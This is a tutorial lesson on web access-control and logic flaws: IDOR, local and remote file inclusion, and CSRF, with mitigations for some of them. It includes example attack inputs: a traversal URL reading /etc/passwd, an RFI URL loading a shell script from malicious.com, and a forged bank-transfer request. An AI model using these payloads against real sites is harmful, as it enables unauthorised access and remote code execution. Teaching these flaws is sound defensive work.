# Day 10: Web Vulnerabilities II - Logic & Access Control Failures

Yesterday, we discussed input injection and client-side scripting. Today, we focus on access control design failures and application logic vulnerabilities: IDOR, File Inclusion, and CSRF.

---

## 1. IDOR (Insecure Direct Object Reference)

**IDOR** occurs when an application exposes a reference to an internal database object or resource (such as a database ID or file path) in a URL or API parameter, without validating if the user is authorized to access it.

```
Attacker logs in and sees their account URL:
https://bank.com/api/v1/accounts/9928

The attacker manually increments the ID value in their browser:
https://bank.com/api/v1/accounts/9929
```

If the web server returns account data for `9929` without checking if the attacker owns that account, an IDOR vulnerability exists.

### Mitigation: Object-Level Access Control
Implement a centralized authorization check on the server side to verify that the logged-in user is authorized to access the specific requested object before returning it.

---

## 2. File Inclusion (LFI & RFI)

**File Inclusion** occurs when an application takes user input and passes it directly into a backend file system path loading function.

### Local File Inclusion (LFI)
The attacker reads local files on the server’s local disk by traversing directories using `../` (Directory Traversal):
```
Vulnerable path request:
https://site.com/view.php?page=contact.php

Attacker inputs directory traversal payload:
https://site.com/view.php?page=../../../../etc/passwd
```
The server resolves the directory path and returns the sensitive Linux password list file.

### Remote File Inclusion (RFI)
The attacker tricks the server into loading and executing a malicious script hosted on a remote server:
```
https://site.com/view.php?page=http://malicious.com/shell.txt
```

---

## 3. CSRF (Cross-Site Request Forgery)

**CSRF** is an attack that forces an authenticated user to execute unwanted actions on a web application in which they are currently logged in.

```
1. Victim is logged into securebank.com.
2. Victim visits a malicious website: hackerforum.com.
3. hackerforum.com contains an invisible form that sends a post request to:
   securebank.com/transfer?amount=10000&to=hacker
4. The victim's browser automatically appends their secure session cookie.
5. securebank.com executes the transfer, believing the victim performed the action!
```

### Mitigation: Anti-CSRF Tokens
Use unique, unpredictable, and cryptographically secure **Anti-CSRF Tokens** associated with the user's active session. The server must validate this token before executing any state-changing request (such as bank transfers or password updates).
